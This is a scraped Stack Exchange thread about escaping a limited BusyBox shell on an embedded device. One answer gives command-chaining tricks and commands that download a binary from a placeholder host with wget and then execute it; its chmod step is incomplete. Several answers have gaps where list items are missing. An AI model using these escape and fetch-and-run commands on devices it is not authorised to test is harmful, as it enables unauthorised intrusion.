{
  "title": "Limited BusyBox shell",
  "link": "https://reverseengineering.stackexchange.com/questions/13402/limited-busybox-shell",
  "content": "I'm testing some  embedded device, and there is lack of documentation. When I telnet to device, I get only limited shell.\n\n```\nBusyBox v1.19.2 (built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n# help\nBuilt-in commands:\n------------------\n        . : [ [[ bg break cd chdir continue echo eval exec exit export\n        false fg getopts hash help jobs kill local printf pwd read readonly\n        return set shift source test times trap true type ulimit umask\n        unset wait\n\n```\nThis is limited shell, its not clear, how to get into the full shell?\n\n",
  "votes": "0",
  "answers": 3,
  "views": "9k",
  "tags": [
    "linux",
    "firmware",
    "embedded",
    "networking"
  ],
  "user": "fxgreen",
  "time": "Sep 3, 2016 at 12:58",
  "comments": [],
  "answers_data": [
    {
      "content": "You will need to be root to do either of the above.\n\n",
      "votes": "3",
      "user": "Stuart Cardall",
      "time": "Apr 14, 2017 at 18:14",
      "is_accepted": false,
      "comments": []
    },
    {
      "content": "BusyBox is mainly focused on size-optimizing and commands could be excluded/included during compile time. So, without providing additional informations, it seems to be a very limited set of installed components.\n\nHowever, it should be clear, that this doesn't mean that the firmware of the device doesn't support specific utilities per se. If this is not flully clear, you should take a look at the FAQ - What is Busybox section. Some cites should make this fully clear:\n\nYou should probably focus more on the specific device and installed firmware, than concentrate on the limited set of components linked to Busybox itself.\n\n",
      "votes": "2",
      "user": "knx",
      "time": "Aug 31, 2016 at 20:21",
      "is_accepted": false,
      "comments": [
        {
          "user": "fxgreen",
          "text": "ok, forgot cli command.",
          "time": null
        }
      ]
    },
    {
      "content": "Unfortunately for you, nowadays most embedded devices (i.e. routers, iot devices, etc..) try to prevent the users to access the inner system so they can't hack or modify it. This is a measure to prevent the work of botnets like mirai, though the protections are not always very effective.\n\nA limited busybox shell is a very common scenario. Luckily, speaking in general, busybox requires an underlying shell if there's any kind of user interface (like telnet or ssh). This means that it may be possible to bypass that shell and run commands on the underlying shell (i.e. /bin/sh is very common).\n\nBefore trying to escape the busybox sandbox, you must have in account the following:\n\nOnce you are ready, you can try the following \"tricks\":\n(All of the rely on shell operators)\n\nTry things like\n\n```\necho \"Hello World\" & <your command>\n\n```\nThis will execute your command if:\n\nThere are other methods like:\n\n```\necho \"Hello World\" `your command`\necho \"Hello World\" || <your command>\n\n```\nAnd other variations you can find over the internet or try by yourself.\n\nEDIT: I'm editing to add an example of how you could escape the shell and gain further execution.\n\n```\necho \"Hello World\" & wget yourweb.com/yourbinary\necho \"Hello World\" & chmod yourbinary \necho \"Hello World\" & ./yourbinary\n\n```\nor directly ./yourbinary\n\nThat's the idea. As for the chmod sorry but I don't remember the exact arguments to give execution permissions.\n\nEDIT2: I've noticed your shell says ash, so probably busybox has been executed from an (automated) script running from ash. In this case you would like to directly run commands on the /bin/ash shell.\n\n",
      "votes": "1",
      "user": "78dtat78da",
      "time": "Apr 16, 2017 at 16:32",
      "is_accepted": false,
      "comments": []
    }
  ]
}